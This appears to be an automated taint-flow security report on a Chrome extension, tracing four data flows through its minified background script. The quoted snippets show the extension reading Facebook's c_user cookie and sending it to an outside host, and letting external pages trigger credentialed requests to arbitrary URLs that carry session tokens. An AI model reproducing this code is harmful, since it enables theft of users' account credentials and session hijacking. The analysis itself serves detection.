# Source-level Taint Flow — eojdckfcadamkapabechhbnkleligand 40.5

- Source type: CRX
- Files with issues: 1 / 1
- Distinct taint flows: 4  (collapsed from 4 raw issue entries)

> Tainted token spans are wrapped in `»…«`. Each flow is de-duplicated; propagation lists every distinct source line once, in flow order, one line per step. Long minified lines are windowed around the tainted span. See `report.flows.json` for the machine form.

---

## Flow #1 — CHROME_ONMESSAGEEXTERNAL_MESSAGE (chrome.runtime.onMessageExternal.addListener[message])

- **Source**: `CHROME_ONMESSAGEEXTERNAL_MESSAGE` — `background.min` L1:C1972 -> L1:C1973  `…ction(s,m,h){return(async()=>{const d=new URL(m.url).hostname;if(!l.includes(d))return h({error:"Invalid request"});if(!»s«.cmd)return h({error:"Invalid request"});if("ping"===s.cmd)return h("pong");const f=await chrome.cookies.get({url:"https…`
- **Sink(s)**:
  - `CHROME_TABS_CREATE_OPTIONS` — `background.min` L1:C2183 -> L1:C2214  `…chrome.cookies.get({url:"https://facebook.com",name:"c_user"});f?"pingping"===s.cmd?h("pongpong"):"tab"===s.cmd&&s.url?(»chrome.tabs.create({url:s.url})«,h(!0)):"init"===s.cmd?(()=>{const e={};return fetch("https://www.facebook.com/policies_center/").then((e=>e.text())).th…`
  - `FETCH_RESOURCE` ([Unknown URL]) — `background.min` L1:C2832 -> L1:C2986  `…e.name})}return e})).catch((()=>e))})().then((e=>h(e))):chrome.storage.local.get().then((t=>{if("str"===s.cmd&&s.config)»fetch(s.config.url,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify({...s.config.body,uid:t.id})})«.then((e=>e.json())).then((e=>h(e))).catch((e=>h(e)));else if("graphqlbatch"===s.cmd&&s.config){const n=[t.id,f.value,Da…`  (url-control=FULL)
  - `FETCH_BODY` ([Unknown URL]) — `background.min` L1:C2832 -> L1:C2986  `…e.name})}return e})).catch((()=>e))})().then((e=>h(e))):chrome.storage.local.get().then((t=>{if("str"===s.cmd&&s.config)»fetch(s.config.url,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify({...s.config.body,uid:t.id})})«.then((e=>e.json())).then((e=>h(e))).catch((e=>h(e)));else if("graphqlbatch"===s.cmd&&s.config){const n=[t.id,f.value,Da…`
  - `FETCH_RESOURCE` ([Unknown URL]) — `background.min` L1:C4015 -> L1:C4034  `…ms).map((e=>`${encodeURIComponent(e)}=${encodeURIComponent(s.config.queryParams[e])}`)).join("&");s.config.url+=`?${e}`}»fetch(s.config.url)«.then((e=>s.config.toText?e.text():e.json())).then((e=>h(e))).catch((e=>h(e)))}else h({error:"Unrecognized request."});v…`  (url-control=FULL)
  - `FETCH_RESOURCE` ([Unknown URL]) — `background.min` L1:C3654 -> L1:C3718  `…config){const e=new FormData;for(const t in s.config.formData)e.append(t,s.config.formData[t]);e.append("fb_dtsg",t.dt),»fetch(s.config.url,{method:"POST",body:e,credentials:"include"})«.then((e=>s.config.toText?e.text():e.json())).then((e=>h(e))).catch((e=>h(e)))}else if("graph"===s.cmd&&s.config){if(s.c…`  (url-control=FULL)
  - `FETCH_BODY` ([Unknown URL]) — `background.min` L1:C3654 -> L1:C3718  `…config){const e=new FormData;for(const t in s.config.formData)e.append(t,s.config.formData[t]);e.append("fb_dtsg",t.dt),»fetch(s.config.url,{method:"POST",body:e,credentials:"include"})«.then((e=>s.config.toText?e.text():e.json())).then((e=>h(e))).catch((e=>h(e)))}else if("graph"===s.cmd&&s.config){if(s.c…`
  - `FETCH_RESOURCE` ([Unknown URL]) — `background.min` L1:C3361 -> L1:C3451  `…rmData[e]]=n[e];const r={"Content-Type":"application/json"};for(const e in s.config.headers)r[s.config.headers[e]]=n[e];»fetch(s.config.url,{method:"POST",body:JSON.stringify(c),headers:r,credentials:"include"})«.then((e=>e.text())).then((e=>h(e))).catch((e=>h(e)))}else if("graphql"===s.cmd&&s.config){const e=new FormData;for(cons…`  (url-control=FULL)
- **Sanitized**: NO
- **Frame**: `BG_1`

- **Propagation** (264 raw steps → 1 distinct lines):
   1. L1 `…valid request"});if(»!s.cmd)return h({error:"Invalid request"});if("ping"===s.cmd)return h("pong");const f=await chrome.cookies.get({url:"htt …⟨tainted span: 2062 chars⟩… odeURIComponent(e)}=${encodeURIComponent(s.config.queryParams[e])}`)).join("&");s.config.url+=`?${e}`}fetch(s.config.url«).then((e=>s.config.…`  · ASSIGN:identifier, ELEMENT:member-element, ASSIGN:unary, ASSIGN:binary-right, ASSIGN:logical-left, ASSIGN:logical-right, ELEMENT:object.setProperty, COPY:object-spread, RETURN:json.stringify, ITERATE:loop.iteration, ELEMENT:member-element-container, RETURN:encodeURIComponent, ASSIGN:template-literal

---

## Flow #2 — CHROME_COOKIES_INFO (cookies(https://facebook.com))

- **Source**: `CHROME_COOKIES_INFO` — `background.min` L1:C2126 -> L1:C2127  `…uest"});if("ping"===s.cmd)return h("pong");const f=await chrome.cookies.get({url:"https://facebook.com",name:"c_user"});»f«?"pingping"===s.cmd?h("pongpong"):"tab"===s.cmd&&s.url?(chrome.tabs.create({url:s.url}),h(!0)):"init"===s.cmd?(()=>{cons…`
- **Sink(s)**:
  - `FETCH_HEADERS` ([Unknown URL]) — `background.min` L1:C3361 -> L1:C3451  `…rmData[e]]=n[e];const r={"Content-Type":"application/json"};for(const e in s.config.headers)r[s.config.headers[e]]=n[e];»fetch(s.config.url,{method:"POST",body:JSON.stringify(c),headers:r,credentials:"include"})«.then((e=>e.text())).then((e=>h(e))).catch((e=>h(e)))}else if("graphql"===s.cmd&&s.config){const e=new FormData;for(cons…`
  - `FETCH_BODY` ([Unknown URL]) — `background.min` L1:C3361 -> L1:C3451  `…rmData[e]]=n[e];const r={"Content-Type":"application/json"};for(const e in s.config.headers)r[s.config.headers[e]]=n[e];»fetch(s.config.url,{method:"POST",body:JSON.stringify(c),headers:r,credentials:"include"})«.then((e=>e.text())).then((e=>h(e))).catch((e=>h(e)))}else if("graphql"===s.cmd&&s.config){const e=new FormData;for(cons…`
- **Sanitized**: NO
- **Frame**: `BG_1`

- **Propagation** (45 raw steps → 1 distinct lines):
   1. L1 `…om",name:"c_user"});»f?"pingping"===s.cmd?h("pongpong"):"tab"===s.cmd&&s.url?(chrome.tabs.create({url:s.url}),h(!0)):"init"===s.cmd?(()=>{con …⟨tainted span: 1378 chars⟩… hod:"POST",body:JSON.stringify(c),headers:r,credentials:"include"}).then((e=>e.text())).then((e=>h(e))).catch((e=>h(e)))«}else if("graphql"==…`  · ASSIGN:identifier, ELEMENT:member-element, ELEMENT:object.setProperty, ELEMENT:implicit.add, ELEMENT:computed-member-unknown-alternative, ELEMENT:member-element-container, RETURN:json.stringify

---

## Flow #3 — CHROME_COOKIES_INFO (cookies(https://facebook.com))

- **Source**: `CHROME_COOKIES_INFO` — `background.min` L1:C741 -> L1:C742  `…hrome.runtime.setUninstallURL(s);const m=()=>{chrome.cookies.get({url:"https://facebook.com",name:"c_user"},(e=>{null!==»e«?(chrome.storage.local.set({c_user:e}),chrome.tabs.create({url:"https://loc.dev/dashboard"})):(chrome.tabs.create({url:"…`
- **Sink(s)**:
  - `CHROME_LOCAL_STORAGE` (c_user) — `background.min` L1:C744 -> L1:C780  `…me.runtime.setUninstallURL(s);const m=()=>{chrome.cookies.get({url:"https://facebook.com",name:"c_user"},(e=>{null!==e?(»chrome.storage.local.set({c_user:e})«,chrome.tabs.create({url:"https://loc.dev/dashboard"})):(chrome.tabs.create({url:"https://www.facebook.com/"}),chrome.no…`
- **Sanitized**: NO
- **Frame**: `BG_1`

- **Propagation** (21 raw steps → 1 distinct lines):
   1. L1 `…hrome.runtime.setUninstallURL(s);const m=()=>{chrome.cookies.get({url:"https://facebook.com",name:"c_user"},(e=>{null!==»e?(chrome.storage.local.set({c_user:e})«,chrome.tabs.create({url:"https://loc.dev/dashboard"})):(chrome.tabs.create({url:"https://www.facebook.com/"}),chrome.no…`  · ASSIGN:identifier, ASSIGN:binary-right, ELEMENT:object.setProperty

---

## Flow #4 — CHROME_COOKIES_INFO (cookies(https://facebook.com))

- **Source**: `CHROME_COOKIES_INFO` — `background.min` L1:C1558 -> L1:C1559  `…ntime.getManifest(),id:chrome.runtime.id};chrome.cookies.get({url:"https://facebook.com",name:"c_user"},(e=>{l.c_user=e?»e«.value:"NOT FOUND",fetch("https://loc.dev/rtx3070",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.…`
- **Sink(s)**:
  - `FETCH_BODY` (https://loc.dev/rtx3070) — `background.min` L1:C1578 -> L1:C1693  `…id:chrome.runtime.id};chrome.cookies.get({url:"https://facebook.com",name:"c_user"},(e=>{l.c_user=e?e.value:"NOT FOUND",»fetch("https://loc.dev/rtx3070",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(l)})«}))})())}));const l=chrome.runtime.getManifest().externally_connectable.matches.map((e=>new URL(e).hostname));chrome.run…`
- **Sanitized**: NO
- **Frame**: `BG_1`

- **Propagation** (9 raw steps → 1 distinct lines):
   1. L1 `…a(e,t))return;const »l={...chrome.runtime.getManifest(),id:chrome.runtime.id};chrome.cookies.get({url:"https://facebook.com",name:"c_user"},( …⟨tainted span: 270 chars⟩… UND",fetch("https://loc.dev/rtx3070",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(l)})«}))})())}));const l=…`  · ASSIGN:identifier, ELEMENT:member-element, ASSIGN:conditional-consequent, ELEMENT:object.setProperty, RETURN:json.stringify

---
